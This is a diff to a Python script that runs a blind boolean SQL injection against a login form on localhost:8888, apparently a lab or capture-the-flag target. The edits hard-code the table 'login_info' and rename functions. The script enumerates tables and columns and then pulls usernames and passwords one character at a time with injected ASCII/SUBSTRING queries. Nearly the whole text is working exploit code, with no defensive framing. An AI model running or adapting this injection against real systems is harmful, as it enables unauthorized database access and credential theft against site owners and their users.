@@ -20,12 +20,13 @@ def getNumberOfTables():
     print("Number of tables: " + str(numberOfTables - 1))
 
 
-def getNamesOfTables(numberOfTables):
+def getNamesOfTables():
 
     payload = {
         "username": "",
         "password": ""
     }
+    numberOfTables = 1
 
     for i in range(numberOfTables):
         length = 1
@@ -55,7 +56,7 @@ def getNamesOfTables(numberOfTables):
         print("Name of table: " + name)
 
 
-def getNumberOfColumns(tableName):
+def getNumberOfColumns():
 
     payload = {
         "username": "",
@@ -63,6 +64,7 @@ def getNumberOfColumns(tableName):
     }
     status = ""
     numberOfColumns = 0
+    tableName = "login_info"
 
     while(status != "Success"):
         payload["username"] = "' OR (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='{}') = {}-- ".format(
@@ -74,12 +76,14 @@ def getNumberOfColumns(tableName):
     print("Number of columns: " + str(numberOfColumns - 1))
 
 
-def getNamesOfColumns(numberOfColumns, tableName):
+def getNamesOfColumns():
 
     payload = {
         "username": "",
         "password": ""
     }
+    numberOfColumns = 2
+    tableName = "login_info"
 
     for i in range(numberOfColumns):
         length = 1
@@ -109,37 +113,46 @@ def getNamesOfColumns(numberOfColumns, tableName):
         print("Name of column: " + name)
 
 
-def getNumberOfRows(tableName, columnName):
+def getNumberOfUsernames():
+
 
     payload = {
         "username": "",
         "password": ""
     }
     status = ""
-    numberOfRows = 0
+    numberOfUsernames = 0
+    tableName = "login_info"
+    columnName = "username"
 
     while(status != "Success"):
-        payload["username"] = "' OR (SELECT COUNT({}) FROM {}) = {}-- ".format(columnName, tableName, numberOfRows)
+        payload["username"] = "' OR (SELECT COUNT({}) FROM {}) = {}-- ".format(
+            columnName, tableName, numberOfUsernames)
         r = requests.post("http://localhost:8888/", data=payload)
         status = r.content.decode("utf-8")
-        numberOfRows += 1
+        numberOfUsernames += 1
 
-    print("Number of rows: " + str(numberOfRows - 1))
+    print("Number of usernames: " + str(numberOfUsernames - 1))
 
-def getColumnData(tableName, columnName, numberOfRows):
+
+def getUsernames():
 
     payload = {
         "username": "",
         "password": ""
     }
+    tableName = "login_info"
+    columnName = "username"
+    numberOfRows = 25
 
     for i in range(numberOfRows):
         length = 1
         data = ""
-        status=""
+        status = ""
 
         while(status != "Success"):
-            payload["username"] = "' OR (SELECT LENGTH({}) FROM {} ORDER BY {} DESC LIMIT {},1) = {}-- ".format(columnName, tableName, columnName, i, length)
+            payload["username"] = "' OR (SELECT LENGTH({}) FROM {} ORDER BY {} DESC LIMIT {},1) = {}-- ".format(
+                columnName, tableName, columnName, i, length)
             r = requests.post("http://localhost:8888/", data=payload)
             status = r.content.decode("utf-8")
             length += 1
@@ -149,7 +162,8 @@ def getColumnData(tableName, columnName, numberOfRows):
             numberOfAsciiCharacters = 128
 
             for k in range(numberOfAsciiCharacters):
-                payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT {} FROM {} ORDER BY {} DESC LIMIT {}, 1), {}, 1))) = {}-- ".format(columnName, tableName, columnName, i, j + 1, k)
+                payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT {} FROM {} ORDER BY {} DESC LIMIT {}, 1), {}, 1))) = {}-- ".format(
+                    columnName, tableName, columnName, i, j + 1, k)
                 r = requests.post("http://localhost:8888/", data=payload)
                 status = r.content.decode("utf-8")
 
@@ -159,6 +173,7 @@ def getColumnData(tableName, columnName, numberOfRows):
                     break
 
         print(data)
+
 
 def getPassword(username):
     columnName = "password"
@@ -171,10 +186,11 @@ def getPassword(username):
     }
     length = 1
     password = ""
-    status=""
+    status = ""
 
     while(status != "Success"):
-        payload["username"] = "' OR (SELECT LENGTH({}) FROM {} WHERE {} = '{}' LIMIT 1) = {}-- ".format(columnName, tableName, columnName2, username, length)
+        payload["username"] = "' OR (SELECT LENGTH({}) FROM {} WHERE {} = '{}' LIMIT 1) = {}-- ".format(
+            columnName, tableName, columnName2, username, length)
         r = requests.post("http://localhost:8888/", data=payload)
         status = r.content.decode("utf-8")
         length += 1
@@ -184,7 +200,8 @@ def getPassword(username):
         numberOfAsciiCharacters = 128
 
         for k in range(numberOfAsciiCharacters):
-            payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT {} FROM {} WHERE {} = '{}' LIMIT 1), {}, 1))) = {}-- ".format(columnName, tableName, columnName2, username, j + 1, k)
+            payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT {} FROM {} WHERE {} = '{}' LIMIT 1), {}, 1))) = {}-- ".format(
+                columnName, tableName, columnName2, username, j + 1, k)
             r = requests.post("http://localhost:8888/", data=payload)
             status = r.content.decode("utf-8")
 
@@ -192,4 +209,4 @@ def getPassword(username):
                 character = chr(k)
                 password = password + character
                 break
-    print("Password: " + password);
+    print("Password: " + password)
